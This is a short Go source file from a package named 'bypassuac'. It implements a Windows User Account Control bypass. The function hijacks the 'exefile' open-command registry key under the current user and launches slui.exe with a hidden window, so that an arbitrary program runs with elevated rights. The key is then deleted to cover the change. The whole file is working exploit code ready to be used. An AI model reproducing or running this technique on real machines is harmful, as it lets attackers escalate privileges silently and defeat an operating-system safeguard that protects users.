//go:build windows
// +build windows

// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package bypassuac

import (
	"os/exec"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func ExecSlui(path string) error {
	k, exists, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\exefile\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\exefile\\shell\\open\\command")
	if err = k.SetStringValue("", path); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	time.Sleep(time.Second)
	e := exec.Command("slui.exe")
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = e.Run()
	return err
}
